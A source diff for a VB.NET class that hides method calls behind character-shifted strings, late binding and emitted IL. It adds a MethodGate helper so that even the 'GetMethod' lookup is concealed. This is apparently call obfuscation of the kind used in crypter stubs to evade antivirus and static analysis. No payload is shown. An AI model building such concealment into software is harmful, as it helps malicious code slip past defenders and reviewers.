@@ -3,7 +3,7 @@ Imports System.Runtime.CompilerServices
 Imports System.Reflection.Emit
 Imports System.Reflection
 
-Public Class EncryptedCall
+Public Class EncryptedCalls
 
 #Region "Strings"
     Private Shared q_Str As String() = {"JiyOSOnxp~n&~&", _
@@ -15,7 +15,8 @@ Public Class EncryptedCall
                                         "Hqnz", _
                                         "HqnzJiuv", _
                                         "Lr{urm", _
-                                        "Fvjg{mRx~$n|ru"}
+                                        "Fvjg{mRx~$n|ru", _
+                                        "JiySl|qyo"}
     Private Shared q_Opc As String() = {"Ohfxng9", _
                                         "Feqr", _
                                         "Ohfxng:", _
@@ -81,8 +82,16 @@ Public Class EncryptedCall
         Return Nothing
     End Function
 
+    Private Shared Function MethodGate(ByVal instance As Object, ByVal s As String, ByVal a_T() As Type) As Object
+        If a_T IsNot Nothing Then
+            Return NewLateBinding.LateGet(instance, Nothing, q_Str(10), New Object() {s, a_T}, Nothing, Nothing, Nothing)
+        Else
+            Return NewLateBinding.LateGet(instance, Nothing, q_Str(10), New Object() {s}, Nothing, Nothing, Nothing)
+        End If
+    End Function
+
 #End Region
-    
+
     Public Shared Function _Call(ByVal input As Byte(), ByVal cls As String, ByVal mth As String, ByVal args As Object()) As Object
 
         Initiate()
@@ -92,18 +101,18 @@ Public Class EncryptedCall
         Dim IL As Object = NewLateBinding.LateGet(handler, Nothing, q_Str(0), Nothing, Nothing, Nothing, Nothing)
 
         Dim args_0() As Type = New [Type]() {GetType(Byte())}
-        Dim call_0 As MethodInfo = i_Typ(0).GetMethod(q_Str(1), args_0)
+        Dim call_0 As MethodInfo = MethodGate(i_Typ(0), q_Str(1), args_0)
 
         Dim args_1() As Type = New [Type]() {GetType(String)}
-        Dim call_1 As MethodInfo = i_Typ(0).GetMethod(q_Str(2), args_1)
+        Dim call_1 As MethodInfo = MethodGate(i_Typ(0), q_Str(2), args_1)
 
         Dim args_2() As Type = New [Type]() {GetType(Type)}
-        Dim call_2 As MethodInfo = i_Typ(1).GetMethod(q_Str(3), args_2)
+        Dim call_2 As MethodInfo = MethodGate(i_Typ(1), q_Str(3), args_2)
 
         Dim args_3() As Type = New [Type]() {GetType(Object)}
-        Dim call_3 As MethodInfo = i_Typ(2).GetMethod(q_Str(4), args_3)
+        Dim call_3 As MethodInfo = MethodGate(i_Typ(2), q_Str(4), args_3)
 
-        Dim call_4 As MethodInfo = i_Typ(3).GetMethod(q_Str(5))
+        Dim call_4 As MethodInfo = MethodGate(i_Typ(3), q_Str(5), Nothing)
 
         NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(0)}, Nothing, Nothing, Nothing, True)
         NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(1), call_0}, Nothing, Nothing, Nothing, True)
